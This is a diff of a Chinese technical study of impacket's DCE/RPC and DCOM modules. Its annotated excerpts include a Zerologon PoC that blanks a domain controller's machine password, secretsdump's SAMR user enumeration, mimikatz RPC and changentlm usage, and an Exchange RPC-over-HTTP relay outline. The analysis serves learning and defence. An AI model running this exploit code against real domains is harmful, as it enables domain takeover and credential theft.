 实现了 DCE/RPC 的传输层：通过 DCERPCTransportFactory 按字符串绑定（string binding）建立 TCP、UDP、HTTP、SMB（命名管道）等协议的 RPC 连接。
 
@@ -1792,7 +1464,7 @@ def DCERPCTransportFactory(stringbinding):
         self.doStuff(rpctransport)
 ```
 
-### [MS-EVEN / MS-EVEN6] even.py / even6.py
+### [MS-EVEN / MS-EVEN6] even.py / even6.py — 远程事件日志读取
 
 EventLog Remoting Protocol，它公开 RPC 方法以读取远程计算机上实时和备份事件日志中的事件。even6 中的 6 指第六版（MS-EVEN6）。用于读取远程计算机上[实时事件日志](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/e74c8719-c30e-4f7a-bef7-82753cc0e159#gt_3c0e011b-e37d-40ef-90d6-1ed516f06b1c)和[备份事件日志中的事件。](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/e74c8719-c30e-4f7a-bef7-82753cc0e159#gt_ddd2e7db-ea8f-4488-ac5f-e77d59abe9e4)该协议还指定了如何获取日志的一般信息，例如日志中的记录数、日志中最旧的记录以及日志是否已满。该协议还可用于清除和备份这两种类型的[事件日志](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/e74c8719-c30e-4f7a-bef7-82753cc0e159#gt_bb3fad7e-60bf-46d4-9c3f-7caea47a743e)。
 
@@ -1826,7 +1498,7 @@ OPNUMS = {
 }
 ```
 
-### iphlp.py
+### iphlp.py — IPv6 隧道（IP Helper Service）
 
 iphlpsvc.dll,Windows 中的 iphlpsvc 是一种 Internet 协议帮助程序服务，其工作是帮助检索和修改 Windows 10 PC 的网络配置设置。它有效地允许跨各种 Windows 10 网络协议（如 IPv6 和端口代理等）进行连接。Iphlpsvc 主要用于运行远程数据库或通过 IPv6 连接。
 
@@ -1842,7 +1514,7 @@ OPNUMS = {
 }
 ```
 
-### [MS-LSAD]lsad.py
+### [MS-LSAD] lsad.py — 本地安全机构（域策略管理）
 
 MS-LSAD（本地安全机构（域策略）远程协议）用于管理各种机器和[域](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/31ca2a31-0be4-4773-bcef-05ad6cd3ccfb#gt_b0276eb2-4e65-4cf1-a718-e0920a614aca)安全策略。所有基于 Windows NT 的产品在所有配置中都会在服务端实现并侦听该协议，但并非所有操作在所有配置中都有意义。
 
@@ -2033,7 +1705,7 @@ for key in keys:
                     self.__printSecret(key, secret)
 ```
 
-### [MS-LSAT]lsat.py
+### [MS-LSAT] lsat.py — SID 与名称互转
 
 本地安全机构（转换方法）远程协议，用于在人类可读和机器可读形式之间转换安全主体的标识符。
 
@@ -2077,7 +1749,7 @@ POLICY_LOOKUP_NAMES = 0x00000800  # 打开 Policy 对象时允许进行名称/SI
 
 注意：不要把 `POLICY_LOOKUP_NAMES`（0x800）与“拒绝远程交互登录”之类的用户权利标志混淆——两者数值巧合相同，但属于完全不同的概念（前者是 LSAD/LSAT 的访问掩码位，后者是账户权限）。
 
-### mgmt.py
+### mgmt.py — RPC 远程管理接口
 
 根据开头定义的接口 ID，该接口为 RPC 远程管理接口（RPC Management）。模块完成了以下几个方法；Windows 文档中相关资料不多，方法说明参考了 Linux 下 freedce（FreeDCE RPC and DCOM Toolkit for Linux）的 mgmt.c 源码：
 
@@ -2125,7 +1797,7 @@ OPNUMS = {
 
 对各接口方法具体实现感兴趣的同学可以直接看c源码（https://fossies.org/dox/freedce-1.1.0.7/mgmt_8c_source.html）
 
-### mimilib.py
+### mimilib.py — mimikatz RPC 接口（MimiCommand）
 
 mimikatz定义了自己的rpc idl接口。https://github.com/gentilkiwi/mimikatz/blob/e10bde5b16b747dc09ca5146f93f2beaf74dd17a/mimicom.idl
 
@@ -2137,41 +1809,27 @@ import "ms-dtyp.idl";
 ]
 interface MimiCom
 {
-	typedef [context_handle] void* MIMI_HANDLE;
+	typedef [context_handle] void* MIMI_HANDLE;    // 会话上下文句柄：MimiBind 建立，后续调用携带
 
-	typedef unsigned int ALG_ID;
-	typedef struct _MIMI_PUBLICKEY {
-		ALG_ID sessionType;
-		DWORD cbPublicKey;
-		[size_is(cbPublicKey)] BYTE *pbPublicKey;
-	} MIMI_PUBLICKEY, *PMIMI_PUBLICKEY;
-		
+	// 客户端与服务端在 MimiBind 中交换 Diffie-Hellman 公钥，
+	// 之后的 command 数据都用协商出的会话密钥加密传输
 	NTSTATUS MimiBind(
 		[in] handle_t rpc_handle,
 		[in, ref] PMIMI_PUBLICKEY clientPublicKey,
 		[out, ref] PMIMI_PUBLICKEY serverPublicKey,
 		[out, ref] MIMI_HANDLE *phMimi
 	);
-	
-	NTSTATUS MiniUnbind(
-		[in, out, ref] MIMI_HANDLE *phMimi
-	);
+	......
 
-	NTSTATUS MimiCommand(
+	NTSTATUS MimiCommand(    // 核心方法：加密传输 mimikatz 命令并取回加密结果
 		[in, ref] MIMI_HANDLE phMimi,
 		[in] DWORD szEncCommand,
 		[in, size_is(szEncCommand), unique] BYTE *encCommand,
 		[out, ref] DWORD *szEncResult,
 		[out, size_is(, *szEncResult)] BYTE **encResult
 	);
-
-	NTSTATUS MimiClear(
-		[in] handle_t rpc_handle,
-		[in, string] wchar_t *command,
-		[out] DWORD *size,
-		[out, size_is(, *size)] wchar_t **result
-	);
-}
+	......
+};
 ```
 
 mimilib模块实现了对应的接口方法
@@ -2192,7 +1850,7 @@ mimikatz 的 RPC 接口通过 Diffie-Hellman 密钥交换协商会话密钥，�
   mimikatz # rpc::server
 ```
 
-### [MS-NRPC]nrpc.py
+### [MS-NRPC] nrpc.py — Netlogon 认证与 Zerologon（CVE-2020-1472）
 
 这个协议从名字看就很眼熟——Zerologon（CVE-2020-1472）正是出在这个协议上。
 
@@ -2362,20 +2020,19 @@ CFB 模式每一轮密文的计算方式：先将上一轮的密文（第一轮�
 
 ```python
 def try_zero_authenticate(dc_handle, dc_ip, target_computer):
-  # Connect to the DC's Netlogon service.
+  # 连接域控的 Netlogon 服务（EPM 解析端点 → connect → bind）
   binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
   rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
   rpc_con.connect()
   rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
 
-  # Use an all-zero challenge and credential.
-  plaintext = b'\x00' * 8
-  ciphertext = b'\x00' * 8
+  # ① 核心：challenge 与 credential 全部置零
+  plaintext = b'\x00' * 8      # ClientChallenge = 0
+  ciphertext = b'\x00' * 8     # ClientCredential = 0
 
-  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
+  # 观察 Windows 10 客户端得到的标准 flags（含 AES），仅关闭签名/加密位
   flags = 0x212fffff
 
-  # Send challenge and authentication request.
   serverChallengeResp = nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
   serverChallenge = serverChallengeResp['ServerChallenge']
   try:
@@ -2383,64 +2040,29 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
       rpc_con, dc_handle + '\x00', target_computer+"$\x00", nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
       target_computer + '\x00', ciphertext, flags
     )
+    assert server_auth['ErrorCode'] == 0      # ② 每次尝试 1/256 概率通过校验，失败则抛异常重试
+    ......
 
-    
-    # It worked!
-    assert server_auth['ErrorCode'] == 0
-    print()
-    server_auth.dump()
-    print("server challenge", serverChallenge)
-    #sessionKey = nrpc.ComputeSessionKeyAES(None,b'\x00'*8, serverChallenge, unhexlify("c9a22836bc33154d0821568c3e18e7ff")) # that ntlm is just a randomly generated machine hash from a lab VM, it's not sensitive
-    #print("session key", sessionKey)
+    IV = b'\x00'*16                            # AES-CFB8 的 IV 固定全零
+    .....
+    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
+    authenticator['Credential'] = ciphertext    # 会话密钥为全零时，全零凭证即可通过后续校验
+    authenticator['Timestamp'] = b"\x00" * 4
 
-    try:
-      IV=b'\x00'*16
-      #Crypt1 = AES.new(sessionKey, AES.MODE_CFB, IV)
-      #serverCred = Crypt1.encrypt(serverChallenge)
-      #print("server cred", serverCred)
-      #clientCrypt = AES.new(sessionKey, AES.MODE_CFB, IV)
-      #clientCred = clientCrypt.encrypt(b'\x00'*8)
-      #print("client cred", clientCred)
-      #timestamp_var = 10
-      #clientStoredCred =  pack('<Q', unpack('<Q', b'\x00'*8)[0] + timestamp_var)
-      #print("client stored cred", clientStoredCred)
-      authenticator = nrpc.NETLOGON_AUTHENTICATOR()
-      #authenticatorCrypt = AES.new(sessionKey, AES.MODE_CFB, IV)
-      #authenticatorCred = authenticatorCrypt.encrypt(clientStoredCred);
-      #print("authenticator cred", authenticatorCred)
-      authenticator['Credential'] = ciphertext #authenticatorCred
-      authenticator['Timestamp'] = b"\x00" * 4 #0 # timestamp_var
-      #request = nrpc.NetrLogonGetCapabilities()
-      #request['ServerName'] = '\x00'*20
-      #request['ComputerName'] = target_computer + '\x00'
-      #request['Authenticator'] = authenticator
-      #request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
-      #request['ReturnAuthenticator']['Timestamp'] = 0 
-      #request['QueryLevel'] = 1
-      #resp = rpc_con.request(request)
-      #resp.dump()
-      
-      request = nrpc.NetrServerPasswordSet2()
-      request['PrimaryName'] = NULL
-      request['AccountName'] = target_computer + '$\x00'
-      request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
-      request['ComputerName'] = target_computer + '\x00'
-      request["Authenticator"] = authenticator
-      #request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
-      #request['ReturnAuthenticator']['Timestamp'] = 0
-      request["ClearNewPassword"] = b"\x00"*516
-      resp = rpc_con.request(request)
-      resp.dump()
+    # ③ 利用 NetrServerPasswordSet2 将机器账户密码置为空（ClearNewPassword 全零）
+    request = nrpc.NetrServerPasswordSet2()
+    request['PrimaryName'] = NULL
+    request['AccountName'] = target_computer + '$\x00'
+    request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
+    request['ComputerName'] = target_computer + '\x00'
+    request["Authenticator"] = authenticator
+    request["ClearNewPassword"] = b"\x00"*516
+    resp = rpc_con.request(request)
+    resp.dump()
 
-      #request['PrimaryName'] = NULL
-      #request['ComputerName'] = target_computer + '\x00'
-      #request['OpaqueBuffer'] = b'HOLABETOCOMOANDAS\x00'
-      #request['OpaqueBufferSize'] = len(b'HOLABETOCOMOANDAS\x00')
-      #resp = rpc_con.request(request)
-      #resp.dump()      
-    except Exception as e:
-      print(e)
     return rpc_con
+  except Exception as e:
+    print(e)
 
 
 def perform_attack(dc_handle, dc_ip, target_computer):
@@ -2463,6 +2085,8 @@ def perform_attack(dc_handle, dc_ip, target_computer):
     
 MAX_ATTEMPTS = 2000
 ```
+
+> 摘录说明：原 PoC 中还有大段注释掉的调试代码（NetrLogonGetCapabilities 试探、sessionKey 手动推导、NetrLogonSendToSam 等），与攻击链无关，此处略去。
 
 代码将 challenge 和 credential 全部置零，重复请求直到认证成功，再通过 NetrServerPasswordSet2 将域控机器账户密码置空。每次尝试成功的概率为 1/256 且相互独立，运行 N 次至少成功一次的概率为 `1-(255/256)**N`，2000 次即 99.96%。
 
@@ -2522,7 +2146,7 @@ OPNUMS = {
 }
 ```
 
-### [MS-NSPI]/[MS-OXNSPI]nspi.py
+### [MS-NSPI / MS-OXNSPI] nspi.py — Exchange 地址簿协议
 
 名称服务提供者接口 (NSPI) 协议为消息传递客户端提供了一种访问和操作服务器存储的寻址数据的方法。
 
@@ -2585,7 +2209,7 @@ class NSPIAttacks(Exchanger):
             ......
 ```
 
-### [MS-OXABREF]oxabref.py
+### [MS-OXABREF] oxabref.py — 地址簿 NSPI 引用协议
 
 指定地址簿名称服务提供商接口 (NSPI) 引用协议，该协议将客户端地址簿请求重定向到适当的地址簿服务器。MS-OXNSPI 是 Outlook 用来访问地址簿的协议之一。MS-OXABREF是它的辅助协议，用来获取具体的RPC Server名称，通过RPC Proxy连接到它，使用主协议。
 
@@ -2600,7 +2224,7 @@ OPNUMS = {
 
 目前未发现公开利用脚本或已知漏洞涉及该接口。
 
-### [MS-RPCH]rpch.py
+### [MS-RPCH] rpch.py — RPC over HTTP v2（Exchange 中继面）
 
 使用 HTTP 或 HTTPS 作为远程过程调用 (RPC) 协议的传输,RPC over HTTP。
 
@@ -2685,14 +2309,12 @@ examples/rpcmap.py 通过 RPC over HTTP v2 调用 mgmt 的 ifids 枚举出 UUID�
 ```python
   def do(self):
         try:
-            # Connecting to MGMT interface
+            # ① 先绑定 MGMT 接口，用 hinq_if_ids 拿到目标进程已注册的全部接口 UUID
             self.__dce.bind(mgmt.MSRPC_UUID_MGMT)
-
-            # Retrieving interfaces UUIDs from the MGMT interface
             ifids = mgmt.hinq_if_ids(self.__dce)
 
-            # If -brute-uuids is set, bruteforcing UUIDs instead of parsing ifids
-            # We must do it after mgmt.hinq_if_ids to prevent a specified account from being locked out
+            # -brute-uuids：在枚举失败时改为暴力猜测 UUID
+            # （放在 hinq_if_ids 之后，避免多次尝试导致指定账户被锁）
             if self.__brute_uuids:
                 self.bruteforce_uuids()
                 return
@@ -2701,23 +2323,18 @@ examples/rpcmap.py 通过 RPC over HTTP v2 调用 mgmt 的 ifids 枚举出 UUID�
                 uuid.bin_to_uuidtup(ifids['if_id_vector']['if_id'][index]['Data'].getData())
                 for index in range(ifids['if_id_vector']['count'])
               )
+            uuidtups.add(('AFA8BD80-7D8A-11C9-BEF4-08002B102989', '1.0'))   # MGMT 自身
 
-            # Adding MGMT interface itself
-            uuidtups.add(('AFA8BD80-7D8A-11C9-BEF4-08002B102989', '1.0'))
-
+            # ② 逐个 UUID 输出：KNOWN_PROTOCOLS / KNOWN_UUIDS 匹配出协议与服务名
             for tup in sorted(uuidtups):
                 self.handle_discovered_tup(tup)
-                ........
+                ......
+
 def handle_discovered_tup(self, tup):
+        # KNOWN_UUIDS 命中则打印 Provider；再按需暴力版本号 / opnum 探测
         if tup[0] in epm.KNOWN_PROTOCOLS:
             print("Protocol: %s" % (epm.KNOWN_PROTOCOLS[tup[0]]))
-        else:
-            print("Procotol: N/A")
-
-        if uuid.uuidtup_to_bin(tup)[: 18] in KNOWN_UUIDS:
-            print("Provider: %s" % (KNOWN_UUIDS[uuid.uuidtup_to_bin(tup)[:18]]))
-        else:
-            print("Provider: N/A")
+        ......
 
         print("UUID: %s v%s" % (tup[0], tup[1]))
 
@@ -2732,7 +2349,6 @@ def handle_discovered_tup(self, tup):
                     print("Listening: False")
                 else:
                     raise
-        print()
 ```
 
 由于 `/Rpc/*` 同样走 HTTP/HTTPS，可以对其进行中继攻击：一旦绕过身份验证访问 `/Rpc/RpcProxy.dll`，就可以模拟任意用户，通过 RPC over HTTP 协议操作其邮箱：
@@ -2742,7 +2358,7 @@ def handle_discovered_tup(self, tup):
 - 附加 `X-CommonAccessToken` 头冒充目标用户，获取两台 Exchange 服务器的管理员权限；
 - [通过MS-OXCRPC](https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrpc/137f0ce2-31fd-4952-8a7d-6c0b242e4b6a)和[MS-OXCROPS](https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrops/13af6911-27e5-4aa0-bb75-637b02d4f2ef) over MS-RPCH的通信协议格式与 Outlook Anywhere 交互......
 
-### [MS-PAR]par.py
+### [MS-PAR] par.py — 异步打印协议（MS-RPRN 增强版）
 
 打印系统异步远程协议（Print System Asynchronous Remote Protocol），定义了打印客户端和打印服务器之间打印作业处理与打印系统管理信息的通信，是 [MS-RPRN] 的异步增强版本，在 RPC 调用中提供更高强度的身份验证。
 
@@ -2764,7 +2380,7 @@ OPNUMS = {
 
 目前未发现公开利用脚本或已知漏洞涉及该接口。
 
-### [MS-RPRN]rprn.py
+### [MS-RPRN] rprn.py — 打印系统协议（PrinterBug / PrintNightmare）
 
 打印系统远程协议支持客户端和服务器之间的同步打印和假脱机操作，包括打印作业 控制和打印系统 管理。[MS-PAR]中指定了此协议的增强替代品。[MS-PAR] 在客户端和服务器之间的 RPC 调用中提供更高级别的身份验证.
 
@@ -2876,7 +2492,7 @@ def main(dce, pDriverPath, share, handle=NULL):
             pass
 ```
 
-### [MS-RRP]rrp.py
+### [MS-RRP] rrp.py — 远程注册表操作（reg.py 的基础）
 
 Windows 远程注册表协议是一种基于[远程过程调用 (RPC)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/261b039d-95d9-4749-9680-db1851d03945#gt_8a7f6700-8311-45bc-af10-82e10accd331)的客户端/服务器协议，用于远程管理分层**数据存储**，例如[Windows 注册表](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/261b039d-95d9-4749-9680-db1851d03945#gt_5ae1b1fd-a770-4028-b1ca-bcc8fa9bcf0a)。该协议在 examples/reg.py 中得到应用——reg.py 是 MSRPC 接口的远程注册表操作工具，目标是提供与 Windows 的 reg.exe 类似的功能。
 
@@ -2927,7 +2543,7 @@ examples/reg.py 通过调用 rrp 模块中的方法实现了对注册表的远�
 ```python
 # eg./examples/reg.py
 def query(self, dce, keyName):
-        # Let's strip the root key
+        # ① 拆出根键与子键：HKLM/HKU/HKCR 分别对应不同预定义键句柄
         try:
             rootKey = keyName.split('\\')[0]
             subKey = '\\'.join(keyName.split('\\')[1:])
@@ -2945,35 +2561,31 @@ def query(self, dce, keyName):
 
         hRootKey = ans['phKey']
 
+        # ② 打开子键 → 查值 / 枚举子键 / 递归遍历（-v/-ve/-s 选项的输出逻辑略）
         ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey,
                                    samDesired=rrp.MAXIMUM_ALLOWED | rrp.KEY_ENUMERATE_SUB_KEYS | rrp.KEY_QUERY_VALUE)
+        ......
 
         if self.__options.v:
-            print keyName
             value = rrp.hBaseRegQueryValue(dce, ans2['phkResult'], self.__options.v)
-            print '\t' + self.__options.v + '\t' + self.__regValues.get(value[0], 'KEY_NOT_FOUND') + '\t', str(value[1])
-        elif self.__options.ve:
-            print keyName
-            value = rrp.hBaseRegQueryValue(dce, ans2['phkResult'], '')
-            print '\t' + '(Default)' + '\t' + self.__regValues.get(value[0], 'KEY_NOT_FOUND') + '\t', str(value[1])
+            ......
+
         elif self.__options.s:
             self.__print_all_subkeys_and_entries(dce, subKey + '\\', ans2['phkResult'], 0)
         else:
-            print keyName
             self.__print_key_values(dce, ans2['phkResult'])
             i = 0
             while True:
                 try:
+                    # ③ 循环 hBaseRegEnumKey 枚举全部子键，直至抛出异常
                     key = rrp.hBaseRegEnumKey(dce, ans2['phkResult'], i)
-                    print keyName + '\\' + key['lpNameOut'][:-1]
+                    print(keyName + '\\' + key['lpNameOut'][:-1])
                     i += 1
                 except Exception:
                     break
-                    # ans5 = rrp.hBaseRegGetVersion(rpc, ans2['phkResult'])
-                    # ans3 = rrp.hBaseRegEnumKey(rpc, ans2['phkResult'], 0)
 ```
 
-### [MS-SAMR]samr.py
+### [MS-SAMR] samr.py — SAM 账户管理（用户 / 组 / 密码）
 
 安全账户管理器（SAM）远程协议（客户端到服务器）为包含用户和组的账户存储或目录提供管理功能。
 
@@ -3050,37 +2662,40 @@ OPNUMS = {
 该接口包含大量针对用户的操作。举个简单例子：examples/secretsdump.py 通过 hSamrConnect 连接 samr 接口，查询域 SID 并打开域句柄，再通过 hSamrEnumerateUsersInDomain 获取域用户列表：
 
 ```python
- #  eg.examples/secretsdump.py
+# eg.examples/secretsdump.py
 
     def connectSamr(self, domain):
+        # 句柄链：SAMR 连接 → 服务器句柄 → 查域 SID → 域句柄
         rpc = transport.DCERPCTransportFactory(self.__stringBindingSamr)
         rpc.set_smb_connection(self.__smbConnection)
         self.__samr = rpc.get_dce_rpc()
         self.__samr.connect()
         self.__samr.bind(samr.MSRPC_UUID_SAMR)
-        resp = samr.hSamrConnect(self.__samr)
+        resp = samr.hSamrConnect(self.__samr)                        # ① 服务器句柄
         serverHandle = resp['ServerHandle']
 
         resp = samr.hSamrLookupDomainInSamServer(self.__samr, serverHandle, domain)
-        self.__domainSid = resp['DomainId'].formatCanonical()
+        self.__domainSid = resp['DomainId'].formatCanonical()        # ② 域 SID
 
         resp = samr.hSamrOpenDomain(self.__samr, serverHandle=serverHandle, domainId=resp['DomainId'])
-        self.__domainHandle = resp['DomainHandle']
+        self.__domainHandle = resp['DomainHandle']                    # ③ 域句柄
         self.__domainName = domain
- 
- 
+  
+
  def getDomainUsers(self, enumerationContext=0):
         if self.__samr is None:
             self.connectSamr(self.getMachineNameAndDomain()[1])
 
+        # 按账户类型过滤（普通用户 / 工作站 / 服务器 / 域间信任账户）
         try:
-            resp = samr.hSamrEnumerateUsersInDomain(self.__samr, 		self.__domainHandle,
+            resp = samr.hSamrEnumerateUsersInDomain(self.__samr, self.__domainHandle,
                                                     userAccountControl=samr.USER_NORMAL_ACCOUNT | \
                                                                        samr.USER_WORKSTATION_TRUST_ACCOUNT | \
                                                                        samr.USER_SERVER_TRUST_ACCOUNT |\
                                                                        samr.USER_INTERDOMAIN_TRUST_ACCOUNT,
                                                     enumerationContext=enumerationContext)
         except DCERPCException as e:
+            # STATUS_MORE_ENTRIES 表示还有下一页，从异常包中取出当前页继续迭代
             if str(e).find('STATUS_MORE_ENTRIES') < 0:
                 raise
             resp = e.get_packet()
@@ -3129,7 +2744,7 @@ lsadump::changentlm /server:<DC's_IP_or_FQDN> /user:<username> /oldpassword:<cur
 
 ```
 
-### [MS-SRVS]srvs.py
+### [MS-SRVS] srvs.py — 服务器服务（共享 / 会话管理）
 
 服务器服务远程协议，用于通过SMB协议远程启用文件和打印机共享以及对[服务器的](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/1709f6a7-efb8-4ded-b7ae-5cee9ee36320#gt_434b0234-e970-4e8c-bdfa-e16a30d96703)[命名管道](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/1709f6a7-efb8-4ded-b7ae-5cee9ee36320#gt_34f1dfa8-b1df-4d77-aa6e-d777422f9dca)访问，还用于远程管理运行 Windows 的服务器。简单来讲，MS-SRVS 通过 SMB 命名管道（依赖 MS-SMB2 传输）提供文件服务器的远程管理。
 
@@ -3289,7 +2904,7 @@ WksSvc 下的 RPC 服务器本身并不执行任何身份验证注册。如果�
 
 PoC：https://github.com/akamai/akamai-security-research/tree/main/PoCs/cve-2022-38034
 
-### [MS-TSTS]tsts.py
+### [MS-TSTS] tsts.py — 终端服务会话管理
 
 终端服务终端服务器runtime接口协议（Terminal Services Terminal Server Runtime）。终端服务终端服务器runtime接口协议是一种基于 RPC 的协议，用于远程查询和配置[终端服务器](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsts/c41d3367-04c9-4c93-babf-9b5de834eb29#gt_b416f72e-cf04-4d80-bf93-f5753f3b0998)的各个方面。
 
@@ -3329,7 +2944,7 @@ PoC：https://github.com/akamai/akamai-security-research/tree/main/PoCs/cve-2022
 # msg：向远程桌面服务会话 (MSGBOX) 发送消息
 ```
 
-### [MS-WKST]wkst.py
+### [MS-WKST] wkst.py — 工作站服务（登录用户枚举）
 
 工作站服务远程协议，用于远程查询和配置远程计算机上 SMB 重定向器的某些方面。官方描述比较笼统，直接看模块实现了哪些接口方法：
 
@@ -3551,7 +3166,7 @@ RPC 客户端
 - taskschd.dll
 - wmicmiplugin.dll
 
-### [MS-BKRP]bkrp.py
+### [MS-BKRP] bkrp.py — 备份密钥协议（DPAPI 域备份）
 
 密钥备份远程协议（Backup Key）：客户端在服务器的帮助下加密和解密敏感数据（例如加密密钥）。使用此协议加密的数据只能由服务器解密，因此客户端可以安全地将此类加密数据写入没有特别保护的存储中。在 Windows 中，此协议用于通过[Active Directory 域中的](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/32d60aa4-e40c-414a-986c-db731aca7e71#gt_fcaec097-23d5-4b8f-b3e7-5739cc9c1d78)[数据保护应用程序接口 (DPAPI)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/32d60aa4-e40c-414a-986c-db731aca7e71#gt_3af2be04-f627-4a02-a3b0-b465ccede53f)提供 用户密钥加密
 
@@ -3601,12 +3216,11 @@ class BKRPTests(DCERPCTests):
     authn = True
     authn_level = RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 
-    data_in = b"Huh? wait wait, let me, let me explain something to you. Uh, I am not Mr. Lebowski; " \
-              b"you're Mr. Lebowski. I'm the Dude. So that's what you call me. You know, uh, That, or uh, " \
-              b"his Dudeness, or uh Duder, or uh El Duderino, if, you know, you're not into the whole brevity thing--uh."
+    data_in = b"..."   # 测试用明文（原文为一长段电影台词，略）
 
     def test_BackuprKey_BACKUPKEY_BACKUP_GUID_BACKUPKEY_RESTORE_GUID(self):
         dce, rpctransport = self.connect()
+        # ① BACKUPKEY_BACKUP_GUID：请服务端包装秘密
         request = bkrp.BackuprKey()
         request['pguidActionAgent'] = bkrp.BACKUPKEY_BACKUP_GUID
         request['pDataIn'] = self.data_in
@@ -3615,12 +3229,11 @@ class BKRPTests(DCERPCTests):
 
         resp = dce.request(request)
 
-        resp.dump()
-
+        # ② 解析服务端包装出的 WRAPPED_SECRET
         wrapped = bkrp.WRAPPED_SECRET()
         wrapped.fromString(b''.join(resp['ppDataOut']))
-        wrapped.dump()
 
+        # ③ BACKUPKEY_RESTORE_GUID：包装结果原样送回，服务端解包
         request = bkrp.BackuprKey()
         request['pguidActionAgent'] = bkrp.BACKUPKEY_RESTORE_GUID
         request['pDataIn'] = b''.join(resp['ppDataOut'])
@@ -3628,12 +3241,12 @@ class BKRPTests(DCERPCTests):
         request['dwParam'] = 0
 
         resp = dce.request(request)
-        resp.dump()
 
+        # ④ 还原结果应等于原始明文
         self.assertEqual(self.data_in, b''.join(resp['ppDataOut']))
 ```
 
-### [MS-DHCPM]dhcpm.py
+### [MS-DHCPM] dhcpm.py — DHCP 管理协议
 
 在 OPNUMS 中可以看到，dhcpm 模块封装了 DHCP 信息检索相关函数，如 DhcpGetClientInfoV4 等：
 
@@ -3678,7 +3291,7 @@ class DHCPMTests(DCERPCTests):
             dce.request(request)
 ```
 
-### [MS-DRSR]drsuapi.py
+### [MS-DRSR] drsuapi.py — 目录复制服务（DCSync）
 
 目录复制服务 (DRS) 远程协议是一种[RPC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/e5c2026b-f732-4c9d-9d60-b945c0ab54eb#gt_8a7f6700-8311-45bc-af10-82e10accd331) 协议，用于在[Active Directory中](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/e5c2026b-f732-4c9d-9d60-b945c0ab54eb#gt_e467d927-17bf-49c9-98d1-96ddf61ddd90)[复制](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/e5c2026b-f732-4c9d-9d60-b945c0ab54eb#gt_a5678f3c-cf60-4b89-b835-16d643d1debb)和管理数据。该协议由两个名为 drsuapi 和 dsaop 的 RPC 接口组成。每个 drsuapi 方法的名称以“IDL_DRS”开头，而每个 dsaop 方法的名称以“IDL_DSA”开头。
 
@@ -3700,7 +3313,7 @@ NC指的是**application naming context (application NC)**:特定类型的命名
 
 NC 副本：包含对象树的变量，其 根对象由某个命名上下文 (NC)标识。
 
-### [MS-DSSP]dssp.py
+### [MS-DSSP] dssp.py — 目录服务设置（DsRoleGetPrimaryDomainInformation）
 
 指定目录服务设置远程协议，它公开一个 RPC 接口，客户端可以调用该接口来获取与域相关的计算机状态和配置信息。
 
@@ -3731,7 +3344,7 @@ NC 副本：包含对象树的变量，其 根对象由某个命名上下文 (NC
 
 ## 第 6 章 DCOM 与 WMI
 
-### 6.1 DCOM 编程基础
+### 6.1 DCOM 编程基础 — COM / ORPC / 对象引用
 
 RPC 是一种计算机通信协议：它允许运行于一台计算机的程序调用另一个地址空间（通常是开放网络中一台计算机）的子程序，对程序员而言就像调用本地程序一样。DCOM 则是基于 RPC 的远程 COM 对象调用。
 
@@ -3941,7 +3554,7 @@ DCOM实现
   + 它存储与远程对象连接所需的RPC字符串绑定，并将其提供给本地客户端。
   + 它向本地计算机仍持有客户端引用的远程对象发送 ping 消息，并接收在本地计算机上运行的对象的 ping 消息。OXID 解析器的这一职责支撑了 COM 的垃圾回收机制。
 
-### 6.2 dcomrt.py
+### 6.2 dcomrt.py — DCOM 运行时（DCOMConnection / INTERFACE / IActivation）
 
 有了上面的基础，接着看 dcomrt 模块：文件开头定义了常用 DCOM 类的 CLSID 静态常量和错误处理函数，随后定义了 DCOM 通信（ORPC 协议）中使用的数据类型结构体与各类 flag 值。
 
@@ -4293,7 +3906,7 @@ from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
                 return
 ```
 
-### 6.3 dcom 子模块
+### 6.3 dcom 子模块 — oaut / comev / scmp / vds / wmi
 
 #### 6.3.1 [MS-OAUT] oaut.py
 
@@ -4411,25 +4024,7 @@ Invoke           提供对自动化服务器公开的属性和方法的访问
 
 ```python
 class DCOMEXEC:
-    def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, share=None,
-                 noOutput=False, doKerberos=False, kdcHost=None, dcomObject=None, shell_type=None):
-        self.__command = command
-        self.__username = username
-        self.__password = password
-        self.__domain = domain
-        self.__lmhash = ''
-        self.__nthash = ''
-        self.__aesKey = aesKey
-        self.__share = share
-        self.__noOutput = noOutput
-        self.__doKerberos = doKerberos
-        self.__kdcHost = kdcHost
-        self.__dcomObject = dcomObject
-        self.__shell_type = shell_type
-        self.shell = None
-        if hashes is not None:
-            self.__lmhash, self.__nthash = hashes.split(':')
-
+    ......
     def getInterface(self, interface, resp):
         # Now let's parse the answer and build an Interface instance
         objRefType = OBJREF(b''.join(resp))['flags']
